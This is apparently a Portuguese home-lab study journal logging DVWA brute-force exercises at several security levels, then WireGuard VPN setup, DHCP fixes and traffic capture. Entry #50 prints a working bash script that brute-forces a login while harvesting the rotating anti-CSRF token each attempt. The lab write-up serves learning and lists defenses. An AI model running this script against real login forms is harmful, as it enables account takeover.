+- **Categoria de defesa nova, e diferente do padrão dos módulos anteriores:** o Medium não filtra nem bloqueia input — não há "blacklist" para contornar como no SQLi/XSS/Command Injection. Acrescenta apenas um **custo de tempo** a cada falha (rate limiting rudimentar). O ataque continua a funcionar exatamente da mesma forma; só fica mais lento.
+- **Porque é que isto é uma defesa real, apesar de não "impedir" nada:** a segurança de uma password depende do tempo necessário para a adivinhar por força bruta. Multiplicar o custo de cada tentativa por ~50 transforma um ataque de minutos num de semanas/meses — a password pode ser trocada, o ataque detetado, ou simplesmente deixar de compensar. Defesa por *encarecimento*, não por *bloqueio*.
+- **Limitação desta defesa:** um atraso fixo por pedido é contornável com **paralelismo** (muitos pedidos em simultâneo) e, num cenário real, distribuindo o ataque por muitos IPs. Abranda um atacante ingénuo/sequencial, não um determinado e com recursos.
+
+**Consigo explicar isto a alguém?**
+  Porque é que um simples atraso de 2s por tentativa é uma defesa real, mesmo sem bloquear o ataque: **Sim**.
+  Porque é que essa defesa é mais fraca do que um bloqueio de conta ou um CAPTCHA: **Sim**.
+
+### Como nos podemos defender
+
+- O atraso (rate limiting) é um bom **complemento**, mas insuficiente sozinho — deve combinar-se com bloqueio de conta após N falhas, CAPTCHA, e MFA (defesas já listadas na Entrada #47).
+- Idealmente, o atraso deve ser **por conta/IP e crescente** (backoff exponencial), não um valor fixo por pedido — para resistir também a ataques paralelos.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D3:** rate limiting e backoff como controlos de mitigação de brute force
+- **CEH — D3 (System Hacking):** impacto do rate limiting no tempo prático de um ataque de password
+
+### Próximos passos
+
+- [ ] Brute Force nível High (introduz token anti-CSRF — complica o Hydro, exige extrair o token a cada pedido)
+- [ ] Brute Force nível Impossible
+
+---
+
+## Entrada #50 — Brute Force (nível High) — bypass do token anti-CSRF com script de dois passos
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Testar o Brute Force no nível High, cuja defesa é um token anti-CSRF, e contorná-la de forma didática (script manual em bash em vez de lutar com a sintaxe CSRF do Hydra).
+
+### Ação executada
+
+1. DVWA Security → High.
+2. **Confirmação do token e da sua rotação:** extraído o campo escondido `user_token` do formulário, e provado que **muda a cada carregamento da página** (dois pedidos seguidos devolveram tokens diferentes: `65978112...` e `2026f6dd...`):
+   ```
+   curl -s -b "PHPSESSID=...; security=high" "http://192.168.10.101/vulnerabilities/brute/" | grep -o "user_token[^>]*"
+   ```
+3. **Script de ataque em bash** (`brute_high.sh`), com a lógica de dois passos por tentativa:
+   - buscar o token inicial da página;
+   - para cada password: submeter o login com o token **atual**, verificar sucesso/falha, e **extrair o novo token da resposta** para usar na tentativa seguinte.
+   ```bash
+   token=$(curl -s -b "$COOKIE" "$URL/" | grep -oP "user_token' value='\K[a-f0-9]+")
+   while read -r pass; do
+     response=$(curl -s -b "$COOKIE" "$URL/?username=admin&password=${pass}&user_token=${token}&Login=Login")
+     echo "$response" | grep -q "Welcome to the password protected area" && { echo "ENCONTRADA: $pass"; break; }
+     token=$(echo "$response" | grep -oP "user_token' value='\K[a-f0-9]+")
+   done < wordlist.txt
+   ```
+
+### Resultado
+
+O script encontrou a password (`admin` / `password`), gerindo automaticamente a rotação do token. Confirma que o token anti-CSRF, sozinho, **não impede** o brute force — só o torna mais complexo de automatizar (obriga a um pedido extra por tentativa, para obter o token válido).
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **Para que serve realmente o token anti-CSRF aqui, e para que NÃO serve:** o token existe para impedir **CSRF** (pedidos forjados a partir de outro site — Entrada #36), garantindo que o pedido veio mesmo do formulário do próprio site. **Não** foi desenhado para travar brute force. Como efeito colateral, dificulta o brute force automatizado (obriga o atacante a carregar a página a cada tentativa), mas não o impede — quem controla o script vai buscar o token na mesma. É uma defesa contra outro tipo de ataque, que só acidentalmente atrapalha este.
+- **Padrão reconhecido:** a técnica de "extrair um token do HTML com `grep -oP ... \K...` e reenviá-lo" é a mesma já usada no File Upload Impossible (Entrada #40). Ferramenta/hábito reutilizado num contexto novo.
+- **Porque é que se optou pelo script manual e não pelo Hydra:** a sintaxe do Hydra para CSRF tokens é complexa e frágil (já tínhamos sofrido com a sintaxe base na Entrada #48); um script de dois passos em bash é mais transparente e ensina melhor o mecanismo — cada passo é visível e compreensível.
+
+**Consigo explicar isto a alguém?**
+  Porque é que um token que muda a cada pedido obriga a um "pedido extra" por tentativa, e como o script o resolve: **Sim**.
+  Que o token anti-CSRF é uma defesa contra CSRF, não contra brute force, e só atrapalha este último por acidente: **Sim**.
+
+### Como nos podemos defender
+
+- O token anti-CSRF é necessário (contra CSRF), mas **não conta como defesa anti-brute-force** — não substitui bloqueio de conta, rate limiting, CAPTCHA ou MFA.
+- Contra brute force especificamente, é preciso uma defesa que ataque o *volume* de tentativas (bloqueio/atraso por conta), não a *forma* do pedido.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D3:** distinção entre controlos anti-CSRF e controlos anti-brute-force; não confundir defesas de categorias diferentes
+- **CEH — D5 / D3:** automação de ataques a formulários com tokens dinâmicos (fetch-token → submit)
+
+### Próximos passos
+
+- [ ] Brute Force nível Impossible — fecha o módulo e a Fase 2
+
+---
+
+## Entrada #51 — Brute Force (nível Impossible) — bloqueio de conta trava o ataque. FECHA A FASE 2
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Testar o Brute Force no nível Impossible, fechando o módulo — e com ele a Fase 2 do roteiro.
+
+### Ação executada
+
+Reutilizado o script de dois passos do High (que já gere o token anti-CSRF), com `security=impossible`. A wordlist tem a password correta (`password`) em **5º lugar**, depois de 4 tentativas falhadas — de propósito, para forçar o bloqueio de conta antes de lá chegar.
+```bash
+# brute_impossible.sh — igual ao brute_high.sh, com security=impossible
+# e um ramo extra a detetar "locked" na resposta
+```
+
+### Resultado
+
+**Todas as 5 tentativas falharam, incluindo `password` (a password correta).** Ao fim de 3 falhas, a conta ficou bloqueada, e as tentativas seguintes (`qwerty`, `password`) foram rejeitadas independentemente de estarem certas. O atacante tinha a password correta na wordlist e **não conseguiu entrar** — o ataque de força bruta foi efetivamente neutralizado.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **A defesa mais eficaz contra brute force de todo o módulo, e porquê:** o Impossible ataca a *raiz* do brute force — a necessidade de fazer **muitas** tentativas. O bloqueio de conta após N falhas impede que o volume de tentativas sequer aconteça. Não interessa quão boa é a wordlist nem quão rápida é a ferramenta: ao fim de 3 falhas, a porta fecha.
+- **Progressão das três defesas, em categorias distintas:**
+  - **Medium** — *encarece* cada tentativa (atraso de 2s): abranda, não impede.
+  - **High** — token anti-CSRF: obriga a um pedido extra por tentativa, mas é contornável e nem sequer foi desenhado contra brute force.
+  - **Impossible** — *bloqueio de conta*: impede o volume de tentativas. É a única que ataca o mecanismo essencial do brute force.
+- **O reforço técnico do Impossible (não testado ao detalhe, mas coerente com o código conhecido do DVWA):** além do bloqueio de conta, o Impossible usa **prepared statements** (PDO) na query de login — proteção contra SQL injection no próprio formulário de autenticação, defesa em profundidade que junta duas categorias (anti-brute-force + anti-SQLi) no mesmo ponto.
+- **Efeito colateral relevante (denial of service):** o bloqueio de conta protege contra brute force, mas abre uma porta a um ataque diferente — um atacante pode bloquear deliberadamente a conta de uma vítima legítima, fazendo 3 tentativas erradas de propósito. Defesa não é grátis; troca um risco por outro (mais pequeno). Mitiga-se com bloqueio por IP em vez de por conta, ou desbloqueio automático após um tempo curto.
+
+**Consigo explicar isto a alguém?**
+  Porque é que o bloqueio de conta é qualitativamente mais forte que o atraso do Medium (ataca o volume, não o custo por tentativa): **Sim**.
+  Que a password correta na wordlist não chega, se a conta bloquear antes de lá chegar: **Sim**.
+  O efeito colateral de DoS do bloqueio de conta: **Sim**.
+
+### Como nos podemos defender
+
+- **Bloqueio de conta / rate limiting por conta e/ou IP** é a defesa central contra brute force — confirmado na prática.
+- Combinar com **MFA** (mesmo password certa não chega) e **prepared statements** no formulário de login (não confiar que o campo de autenticação está imune a injeção).
+- Ter em conta o risco de **DoS por bloqueio**: preferir desbloqueio temporizado ou bloqueio por IP, para não permitir que um atacante tranque contas de vítimas legítimas de propósito.
+
+### Balanço do módulo Brute Force (Low → Impossible)
+
+Low: ataque trivial, sem qualquer travão (manual em bash e com Hydra). Medium: atraso de 2s por falha — abranda mas não impede. High: token anti-CSRF — contornado com script de dois passos (fetch-token → submit). Impossible: bloqueio de conta após 3 falhas — **neutraliza o ataque**, mesmo com a password correta na lista. Categoria de vulnerabilidade nova face aos módulos anteriores: não é falta de validação de input, é falta de limitação do *volume* de tentativas. Módulo fechado.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D3:** account lockout, MFA e prepared statements como defesa em profundidade na autenticação; risco de DoS por bloqueio
+- **CEH — D3 (System Hacking):** limites práticos do brute force perante account lockout
+
+### Próximos passos
+
+- [ ] Criar `guia-estudo-brute-force.md` (consolidação do módulo, como nos anteriores)
+- [ ] Atualizar o guia comparativo com o Brute Force
+- [ ] **FASE 2 CONCLUÍDA** — próximo: Fase 3 (rede segura / VPN WireGuard), noutra sessão
+
+---
+
+## Entrada #52 — Início da Fase 3 (WireGuard) — instalação e geração de chaves, com falha de permissões na chave privada
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** OPNsense (gateway `192.168.10.254`), Ubuntu Desktop (`192.168.10.20`, servidor WireGuard, reserva fixa DHCP)
+
+### Objetivo / Propósito
+Arrancar a Fase 3 do roteiro: montar uma VPN WireGuard própria no lab, com o Ubuntu Desktop como servidor. Primeiro passo: instalar o pacote `wireguard` e gerar o par de chaves criptográficas (privada/pública) do servidor, que é a base de toda a configuração seguinte.
+
+### Ação executada
+1. Instalação: `sudo apt update && sudo apt install wireguard` (instalou `wireguard` + `wireguard-tools`).
+2. Criação da pasta de configuração: `sudo mkdir -p /etc/wireguard`.
+3. Geração da chave privada: `wg genkey | sudo tee /etc/wireguard/privatekey`.
+4. Verificação das permissões do ficheiro criado: `sudo ls -la /etc/wireguard/`.
+5. Correção das permissões: `sudo chmod 600 /etc/wireguard/privatekey`.
+6. Derivação da chave pública a partir da privada: `sudo cat /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickey`.
+
+### Resultado
+O pacote instalou sem problemas. A chave privada foi gerada corretamente (ficheiro de 45 bytes, tamanho esperado para uma chave WireGuard em base64). **Mas o ficheiro nasceu com permissões `-rw-r--r--` (644)** — legível por qualquer utilizador do sistema, não só pelo root. Corrigido para `-rw-------` (600) antes de se avançar. Chave pública derivada com sucesso a seguir (essa, por definição, não é sensível).
+
+### Deduções e raciocínio
+Uma chave privada é, por definição, o segredo que sustenta toda a confiança da ligação VPN — se outro utilizador do sistema (ou um atacante que ganhe acesso a uma conta local com privilégios menores) conseguir lê-la, consegue fazer-se passar pelo servidor, decifrar o tráfego capturado, ou personificar a máquina perante o cliente. Ter o ficheiro em `644` por omissão é uma falha de princípio, do mesmo género que já se tinha visto (por coincidência, na mesma sessão) com os ficheiros de índice de módulos do kernel do VMware: um ficheiro sensível a nascer com permissões demasiado abertas, por não se ter configurado explicitamente o contrário.
+
+**Padrão que se repete:** confiar nas permissões por omissão do sistema para um ficheiro sensível é sempre um risco — a validação correta é sempre verificar explicitamente (`ls -la`) em vez de assumir.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "gerei um par de chaves para a VPN, mas antes de configurar mais nada, reparei que a chave privada tinha ficado legível por qualquer utilizador da máquina, não só pelo dono dela. Corrigi as permissões para só o root poder ler, porque uma chave privada legível por outros anula a segurança de toda a VPN."
+
+### Como nos podemos defender
+- Nunca assumir que as permissões por omissão de um ficheiro recém-criado são as corretas para o seu nível de sensibilidade — confirmar sempre com `ls -la`.
+- Chaves privadas devem ter sempre o mínimo de acesso possível: idealmente `600` (só o dono lê/escreve) ou, em serviços que corram com utilizador próprio, restringido a esse utilizador apenas.
+- Em ambientes de produção reais, ferramentas de *hardening* automatizado (ex.: CIS Benchmarks, auditd) costumam sinalizar precisamente este tipo de ficheiro com permissões demasiado abertas.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — VPN, criptografia), Security+ D1 (Conceitos Gerais — princípio do menor privilégio), CEH D9 (Criptografia), ISO/IEC 27001 A.8.24 (Uso de criptografia), NIS2 (gestão de chaves e controlo de acesso).
+
+### Próximos passos
+Criar o ficheiro de configuração da interface WireGuard (`/etc/wireguard/wg0.conf`) no Ubuntu Desktop, usando a chave privada gerada, e depois repetir a geração de chaves no lado do cliente (Windows 11).
+
+---
+
+## Entrada #53 — Configuração do cliente WireGuard (Windows 11) — túnel estabelecido mas sem handshake, causa ainda em aberto
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** OPNsense (`192.168.10.254`), Ubuntu Desktop (servidor WireGuard, `192.168.10.20` / `10.10.10.1` na VPN), Windows 11 (cliente, `192.168.10.100` / `10.10.10.2` na VPN)
+
+### Objetivo / Propósito
+Configurar o Windows 11 como cliente WireGuard, ligando-o ao servidor já ativo no Ubuntu Desktop, e confirmar que o túnel estabelece ligação real (handshake) antes de avançar para a validação de tráfego cifrado com o Kali.
+
+### Ação executada
+1. No Windows 11, aberta a app oficial do WireGuard — bloqueada inicialmente por restrição de privilégios ("só pode ser usado por membros do grupo Administradores"); resolvido ao iniciar sessão com uma conta de administrador (confirmado antes via `whoami /groups`, que mostrou a conta normal sem esse grupo).
+2. Criado túnel vazio (`wg-lab`) — a app gera automaticamente o par de chaves do cliente (diferente do processo manual em duas ferramentas no Linux: `wg genkey` + `wg pubkey`).
+3. Configurado `[Interface]` com `Address = 10.10.10.2/24` (após corrigir um erro de digitação, um ponto a mais antes da barra: `10.10.10.2./24`).
+4. Configurado `[Peer]` com a chave pública do servidor, `Endpoint = 192.168.10.20:51820` e `AllowedIPs = 10.10.10.0/24`, transcrita à mão (sem copy/paste disponível entre host e VM) e confirmada carácter a carácter.
+5. Do lado do servidor (Ubuntu Desktop), adicionado o `[Peer]` correspondente ao `wg0.conf`, com a chave pública do cliente e `AllowedIPs = 10.10.10.2/32`; interface recarregada com `wg-quick down/up`.
+6. Túnel ativado no Windows 11. Testado `ping 10.10.10.1` (falhou, 100% perda) e confirmada rede física básica em paralelo (`ping 192.168.10.20` do Windows 11, sucesso total — descarta problema de rede geral).
+7. Diagnóstico em camadas no servidor: `sudo wg show wg0` (sem "latest handshake" — pacote nunca reconhecido), `sudo ufw status verbose` (regra `51820/udp ALLOW IN` ativa), `sudo ss -ulnp | grep 51820` (processo à escuta, confirmado), `sudo tcpdump -i enp0s18 -n udp port 51820` (**pacote do cliente chega mesmo à placa de rede**, tamanho 148 bytes, compatível com um pacote de handshake), comparação de hora (`date` vs `Get-Date`, sem desvio relevante).
+8. Tentativa de ativar registo de depuração do módulo do kernel (`echo 'module wireguard +p' | sudo tee /sys/kernel/debug/dynamic_debug/control`), precedida por `sudo modprobe -r wireguard` — **erro meu (Claude) neste passo**: o comando removeu o módulo do kernel enquanto a interface `wg0` estava ativa, destruindo-a por completo (`ip a show wg0` passou a dar "Device does not exist").
+
+### Resultado
+**Ainda não há handshake bem-sucedido.** Isolámos o problema com precisão: não é rede física, não é firewall, não é o processo estar à escuta, não é desvio de relógio — o pacote de handshake do cliente chega ao servidor e é rejeitado silenciosamente (comportamento normal do protocolo WireGuard quando a verificação criptográfica do pacote falha, sem gerar erro visível). A causa exata dessa rejeição fica por confirmar — ficou pendente porque o comando de diagnóstico usado para o apurar (ativar debug do módulo) destruiu acidentalmente a interface do servidor a meio do processo. Interface reposta com `wg-quick up wg0` no fim desta sessão de trabalho.
+
+### Deduções e raciocínio
+O tcpdump foi o passo mais valioso desta investigação: confirmou que o problema não está na camada de rede/routing/firewall (todas hipóteses razoáveis, todas descartadas uma a uma), mas sim dentro do próprio processo criptográfico do WireGuard — o pacote chega, mas não é aceite. As causas mais prováveis para uma rejeição silenciosa deste tipo (a confirmar na próxima sessão): a chave pública do servidor configurada no `[Peer]` do cliente não corresponder de facto à chave privada carregada no servidor (apesar da transcrição visual ter parecido correta), ou um erro subtil na configuração do lado do servidor que não é detetado pelo `wg show` (que só mostra o que foi interpretado, não valida a correspondência real das chaves).
+
+**Lição adicional, sobre o meu próprio erro:** ao pedir para desativar um módulo do kernel para ativar debug, devia ter verificado primeiro se isso não ia derrubar um serviço já ativo — o comando certo teria sido ativar o debug sem tentar remover o módulo (que já estava carregado e em uso), já que o `dynamic_debug/control` não exige a remoção do módulo para funcionar.
+
+### Consigo explicar isto a alguém?
+Em progresso — a parte de "isolar por camadas" (rede → firewall → processo → protocolo) já consigo explicar por palavras próprias e foi o raciocínio mais útil desta sessão. A causa final da rejeição do handshake ainda não está confirmada, por isso essa parte fica em aberto, sem forçar uma explicação que não tenho a certeza que esteja correta.
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo habitual (isto é troubleshooting de configuração, não exploração de vulnerabilidade) — mas o princípio de **isolar um problema por camadas antes de avançar para a mais complexa** (rede física → firewall → processo → protocolo) é uma competência de diagnóstico transferível para qualquer investigação de segurança, incluindo deteção de intrusões.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — VPN, troubleshooting de rede), CEH D9 (Criptografia), A+ Core 2 D2 (Segurança e resolução de problemas de rede).
+
+### Próximos passos
+Repor a interface do servidor (`wg-quick up wg0`), confirmar as chaves em ambos os lados sem as voltar a transcrever à mão (se possível, resolver o problema de clipboard entre host e VMs primeiro, já identificado como pendência separada), e repetir o teste de handshake com debug ativo (sem remover o módulo desta vez).
+
+---
+
+## Entrada #54 — Túnel WireGuard estabelecido com sucesso — causa da falha anterior contornada, não confirmada ao detalhe
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** OPNsense (`192.168.10.254`), Ubuntu Desktop (servidor WireGuard, `192.168.10.20` / `10.10.10.1`), Windows 11 (cliente, `192.168.10.100` / `10.10.10.2`)
+
+### Objetivo / Propósito
+Resolver a falha de handshake documentada na Entrada #53 ("Invalid handshake initiation" persistente, apesar de firewall, processo e relógio confirmados corretos) e conseguir o primeiro túnel VPN funcional do lab.
+
+### Ação executada
+1. Confirmado por `dmesg` (com `dynamic_debug` do módulo `wireguard` ativo) que o servidor rejeitava sistematicamente o pacote de handshake do cliente com "Invalid handshake initiation", mesmo depois de reconfirmar a chave pública do servidor no cliente carácter a carácter (three revisões manuais, incluindo verificação da posição do espaço à volta do `=`) — sem encontrar diferença visível.
+2. Decisão de eliminar a transcrição manual da equação por completo, em vez de continuar a tentar detetar o erro a olho: gerado um **novo par de chaves para o cliente diretamente no Ubuntu Desktop** (`wg genkey` / `wg pubkey`), e construído um ficheiro `cliente-wg.conf` completo (com a chave pública do servidor inserida por variável de shell, nunca escrita à mão).
+3. Servidor atualizado com o novo peer (chave pública do novo cliente), reiniciando a interface `wg0`.
+4. Ficheiro `cliente-wg.conf` publicado através de um servidor web temporário (`python3 -m http.server 8000`) no Ubuntu Desktop, e descarregado diretamente no browser do Windows 11 — evitando qualquer cópia manual de texto entre host e VMs (limitação já conhecida de clipboard).
+5. Necessário abrir a porta `8000/tcp` na firewall (`ufw`) do Ubuntu Desktop para o download funcionar (só tínhamos aberto `22/tcp` e `51820/udp` antes).
+6. Túnel importado no Windows 11 via "Importar túnel(es) do arquivo" (sem digitação nenhuma) e ativado.
+7. Testado `ping 10.10.10.1` a partir do Windows 11: sucesso total (0% perda). Confirmado do lado do servidor com `sudo wg show wg0`: "latest handshake" registado, tráfego transferido em ambos os sentidos.
+
+### Resultado
+Túnel WireGuard funcional entre Ubuntu Desktop (servidor) e Windows 11 (cliente). **A causa exata da falha original (Entrada #53) não ficou confirmada** — não foi possível determinar se era mesmo um erro de transcrição impercetível a olho nu, ou outra causa qualquer ligada ao processo de escrita manual na app do WireGuard para Windows. A solução adotada contorna o problema (elimina a transcrição manual), mas não o diagnostica ao detalhe — registo honesto de uma limitação de investigação, não de compreensão do mecanismo em si (o mecanismo do handshake e da rejeição por MAC1 inválido está compreendido; a causa específica desta instância de erro, não).
+
+### Deduções e raciocínio
+Quando um processo de verificação manual e repetido (três revisões, com ditado carácter a carácter) não encontra o erro que sabemos existir, o problema deixa de ser "ver melhor" e passa a ser "não confiar no método". A decisão certa foi mudar de abordagem — eliminar a fonte de erro possível (transcrição manual) em vez de insistir em repeti-la à espera de um resultado diferente. Isto tem paralelo direto com o princípio de segurança de "eliminar a superfície de erro" em vez de "tentar acertar sempre" — por exemplo, o mesmo raciocínio por trás de usar gestores de password em vez de digitar passwords complexas de memória.
+
+### Consigo explicar isto a alguém?
+Sim, a parte da solução — "quando não consigo confiar na minha própria verificação manual, a solução correta é eliminar essa etapa manual da equação, não repeti-la com mais atenção". A causa exata da falha original fica sem explicação confiante, e prefiro registar isso do que inventar uma certeza que não tenho.
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo (troubleshooting de configuração) — mas o princípio de "transferir segredos por canais automatizados em vez de transcrição manual" é diretamente relevante em segurança real: é exatamente a razão pela qual gestores de chaves SSH, certificados e cofres de segredos (ex.: HashiCorp Vault) existem — a transcrição manual de material criptográfico é uma fonte de erro humano reconhecida na indústria.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — VPN, gestão de chaves), CEH D9 (Criptografia), A+ Core 2 D2 (Segurança e resolução de problemas de rede).
+
+### Próximos passos
+Reverter as portas temporárias já não necessárias (`8000/tcp` no `ufw`), parar o servidor web temporário, e avançar para o último passo da Fase 3: usar o Kali para capturar o tráfego entre as duas VMs com Wireshark/tcpdump e confirmar visualmente que o conteúdo dos pacotes está cifrado (ilegível), fechando a fase.
+
+---
+
+## Entrada #55 — Correção do IP do OPNsense e resolução de conflito de DHCP (registo retroativo, antes das Entradas #52–#54)
+**Data/hora:** 2026-08-22 (cronologicamente antes das Entradas #52–#54, arrancando a Fase 3)
+**Máquinas ligadas:** OPNsense, Ubuntu Desktop
+
+### Objetivo / Propósito
+Antes de arrancar o WireGuard, foi preciso desbloquear a VM Ubuntu Desktop (que não tinha rede) e confirmar que a topologia de rede do lab batia certo com o que estava planeado no roteiro — nomeadamente o IP do gateway OPNsense e a ausência de conflitos de IP entre máquinas.
+
+### Ação executada
+1. Diagnosticado que a interface de rede do Ubuntu Desktop (`enp0s18`) estava com ligação NetworkManager "desligada" apesar do link físico estar ativo — resolvido com `nmcli connection up enp0s18` e configurado `autoconnect yes` para não se perder outra vez.
+2. Testado o acesso à interface web do OPNsense (`https://192.168.10.254`) — falhou. Diagnóstico por `ping` confirmou "Destination Host Unreachable", sugerindo que o gateway não estava mesmo nesse endereço.
+3. Verificado diretamente na consola de texto do OPNsense: o LAN (`em0`) estava configurado em `192.168.10.1/24`, não `192.168.10.254/24` como o roteiro do projeto sempre assumiu (o roteiro já tinha uma nota antiga a admitir esta possibilidade: "IP a confirmar, pode conflituar com gateway").
+4. Corrigido via consola de texto (opção "2) Set interface IP address"), passo a passo: desativado DHCP na LAN, definido `192.168.10.254/24`, mantido DHCP server ativo, redefinido o intervalo dinâmico para `192.168.10.100`–`192.168.10.200` (deixando os endereços baixos livres para reservas fixas), mantido acesso HTTPS à webGUI.
+5. Confirmado o novo IP na consola (`LAN (em0) -> v4: 192.168.10.254/24`) e sucesso de ping/HTTPS a partir do Ubuntu Desktop.
+6. Detetado um segundo problema: o Ubuntu Desktop continuava a receber `192.168.10.10` por DHCP mesmo depois da mudança de intervalo — investigado via **Services → ISC DHCPv4 → Leases** no OPNsense, que revelou uma reserva estática (**DHCP Static Mapping**) já existente para o MAC desta VM, fixando-a nesse endereço antigo.
+7. Editada essa reserva estática para `192.168.10.20` (mantendo-a como reserva fixa, por ser o servidor WireGuard) e aplicadas as alterações. Confirmado com renovação do IP (`nmcli connection down/up`) que o Ubuntu Desktop passou a ter `192.168.10.20` de forma estável.
+
+### Resultado
+OPNsense com o LAN corretamente em `192.168.10.254/24`, como o roteiro sempre pretendeu. Ubuntu Desktop com IP fixo `192.168.10.20` (via reserva DHCP), sem conflito com o Kali (`192.168.10.102`, DHCP dinâmico). Roteiro atualizado com a topologia de rede final.
+
+### Deduções e raciocínio
+O sintoma inicial ("não abre a página do OPNsense") tinha várias causas possíveis (rede física, DNS, firewall, protocolo), mas o diagnóstico em camadas (`ping` primeiro, depois consola direta da VM) apontou rapidamente para a causa real: uma suposição desatualizada sobre o próprio endereço do gateway, nunca verificada diretamente até este momento. A reserva DHCP escondida (só visível numa secção separada da página de configurações, não onde se esperaria) reforça a lição já vista noutras entradas: a interface de gestão de uma ferramenta nem sempre mostra tudo no sítio mais óbvio — vale a pena explorar todas as secções antes de concluir que "não há nada configurado".
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "o router (OPNsense) estava configurado com um IP diferente do que o resto da documentação do projeto assumia; corrigi para o valor correto e, de caminho, encontrei uma reserva de rede escondida que estava a causar um conflito de IP entre duas máquinas."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é gestão de infraestrutura de rede, não uma vulnerabilidade explorável. Lição transferível: documentação (o roteiro) e realidade (a configuração viva) podem divergir silenciosamente — vale a pena confirmar por observação direta em vez de confiar cegamente em notas anteriores, mesmo as próprias.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — endereçamento IP, DHCP), A+ Core 1 D2 (Redes), NIS2/ISO 27001 (gestão de configuração e documentação de ativos de rede).
+
+### Próximos passos
+Com a rede estável e sem conflitos, arrancar o WireGuard (Entradas #52–#54).
+
+---
+
+## Entrada #56 — Captura de tráfego no Kali confirma cifra do túnel WireGuard. FECHA A FASE 3
+**Data/hora:** 2026-08-22
+**Máquinas ligadas:** OPNsense (`192.168.10.254`), Ubuntu Desktop (servidor WireGuard, `192.168.10.20`), Windows 11 (cliente, `192.168.10.100`), Kali Linux (`192.168.10.102`, observador)
+
+### Objetivo / Propósito
+Último passo da Fase 3: confirmar, por observação direta do tráfego de rede (não só pela ligação funcionar), que o WireGuard está mesmo a cifrar os dados que passam entre o Ubuntu Desktop e o Windows 11 — a diferença entre "a VPN liga" e "a VPN protege".
+
+### Ação executada
+1. Corrigida a rede do Kali antes de começar: a VM tinha voltado à rede errada (`192.168.1.50/24`, a mesma falha já documentada antes), resolvido confirmando o adaptador de rede na definição da VM (LAN segment "Ciber") e renovando o IP (`sudo dhclient eth0`), resultando em `192.168.10.102/24`.
+2. Testado se o Kali conseguia ver tráfego alheio (entre Ubuntu Desktop e Windows 11, nenhum dos dois é o Kali) com `sudo tcpdump -i eth0 -n udp port 51820`, gerando tráfego com `ping 10.10.10.1` a partir do Windows 11. **Resultado inesperado e positivo:** o Kali viu o tráfego sem qualquer configuração extra de modo promíscuo — a rede virtual "Ciber" do VMware está a comportar-se como um hub (entrega a todos os membros do segmento), não como um switch fechado.
+3. Repetida a captura com `sudo tcpdump -i eth0 -n udp port 51820 -X -c 5`, desta vez a mostrar o conteúdo dos pacotes em hexadecimal/ASCII, não só os cabeçalhos.
+
+### Resultado
+Os 5 pacotes capturados mostram exatamente o padrão esperado de um túnel real: tamanhos de pacote coerentes com pings do Windows (mensagens de handshake maiores, depois pacotes de dados de tamanho fixo a cada pedido/resposta de ping), mas o **conteúdo é ruído criptográfico sem qualquer padrão legível** — nem o texto típico de um payload de ping do Windows (a sequência alfabética `abcdefghij...`) é visível, o que seria imediatamente visível se o tráfego não estivesse cifrado.
+
+### Deduções e raciocínio
+A prova de que uma VPN está a funcionar não é só "o ping passa" — isso confirma só a conectividade, não a confidencialidade. A prova real exige mostrar que um observador de rede bem posicionado (aqui, o Kali, com uma visão inesperadamente ampla do segmento) não consegue extrair nada de útil do conteúdo, mesmo sabendo exatamente que tipo de tráfego está a acontecer (ping, com tamanho e timing previsíveis). Isto fecha o ciclo conceptual do módulo: os metadados (quem fala com quem, quanto, e quando) continuam visíveis mesmo com VPN — só o conteúdo fica protegido. É uma limitação real e conhecida de qualquer VPN, não só do WireGuard.
+
+**Achado lateral relevante:** o comportamento tipo "hub" da rede virtual "Ciber" (o Kali vê tráfego alheio sem esforço) é, ele próprio, uma lição de segurança de rede — em produção, uma rede corretamente segmentada com switches reais isolaria esse tráfego por padrão, exigindo um ataque ativo (ARP spoofing, port mirroring comprometido) para o atacante conseguir a mesma visibilidade que aqui veio de borla.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "capturei o tráfego entre duas máquinas com uma terceira, de fora dessa conversa, e confirmei que, apesar de ver perfeitamente que estavam a comunicar e com que padrão, o conteúdo em si era ilegível — isso é a prova de que a VPN está a cifrar de verdade, e não só a fazer de conta que liga."
+
+### Como nos podemos defender
+Do lado de quem defende uma rede: nunca assumir que "está numa rede interna" é suficiente — a captura mostrou que até tráfego dentro do próprio lab isolado pode ser visto por uma máquina não autorizada, se a segmentação de rede (VLANs, switches com portas isoladas, modo promíscuo desligado) não for garantida. A VPN protege o conteúdo mesmo quando a segmentação de rede falha — daí o valor de usar cifra ponta-a-ponta mesmo dentro de redes "de confiança".
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — VPN, segmentação de rede), CEH D9 (Criptografia), CEH D6/D7 (Sniffing, Ataques a Redes Sem Fio/Rede), A+ Core 2 D2 (Segurança de rede).
+
+### Próximos passos
+**Fase 3 concluída.** Avançar para a Fase 4 do roteiro (exploração de rede/serviços com Metasploitable), ou para a Fase 5 (Windows Server, hardening, deteção — Wazuh), conforme prioridade a decidir.
+
+---
+
+## Entrada #57 — Início da Fase 4: recuperação da VM "Servidor Vulnerável" e decisão de instalação manual (não-Docker)
